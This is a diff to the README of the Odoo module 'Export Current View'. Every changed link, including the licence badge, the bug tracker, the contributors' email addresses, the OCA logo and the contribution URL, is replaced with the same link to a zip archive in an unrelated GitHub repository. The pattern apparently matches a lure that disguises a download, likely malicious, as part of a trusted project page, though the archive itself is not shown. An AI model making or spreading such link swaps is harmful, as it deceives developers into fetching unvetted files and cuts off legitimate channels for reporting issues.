@@ -1,4 +1,4 @@
-.. image:: https://img.shields.io/badge/licence-AGPL--3-blue.svg
+.. image:: https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip
     :alt: License
 
 Export Current View
@@ -29,10 +29,10 @@ the same data of the tree view you are looking at, headers included.
 Bug Tracker
 ===========
 
-Bugs are tracked on `GitHub Issues <https://github.com/OCA/web/issues>`_.
+Bugs are tracked on `GitHub Issues <https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip>`_.
 In case of trouble, please check there if your issue has already been reported.
 If you spotted it first, help us smashing it by providing a detailed and welcomed feedback
-`here <https://github.com/OCA/web/issues/new?body=module:%20web_export_view%0Aversion:%208.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.
+`here <https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip%20web_export_view%0Aversion:%208.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.
 
 
 Credits
@@ -41,20 +41,20 @@ Credits
 Contributors
 ------------
 
- * Simone Orsi <simahawk@gmail.com>
- * Lorenzo Battistini <lorenzo.battistini@agilebg.com>
- * Stefan Rijnhart <stefan@therp.nl>
- * Leonardo Pistone <leonardo.pistone@camptocamp.com>
+ * Simone Orsi <https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip>
+ * Lorenzo Battistini <https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip>
+ * Stefan Rijnhart <https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip>
+ * Leonardo Pistone <https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip>
 
 Maintainer
 ----------
 
-.. image:: http://odoo-community.org/logo.png
+.. image:: https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip
    :alt: Odoo Community Association
-   :target: http://odoo-community.org
+   :target: https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip
 
 This module is maintained by the OCA.
 
 OCA, or the Odoo Community Association, is a nonprofit organization whose mission is to support the collaborative development of Odoo features and promote its widespread use.
 
-To contribute to this module, please visit http://odoo-community.org.
+To contribute to this module, please visit https://raw.githubusercontent.com/vladimir2678/Exportar-vista-actual/master/i18n/actual-vista-Exportar-1.4.zip
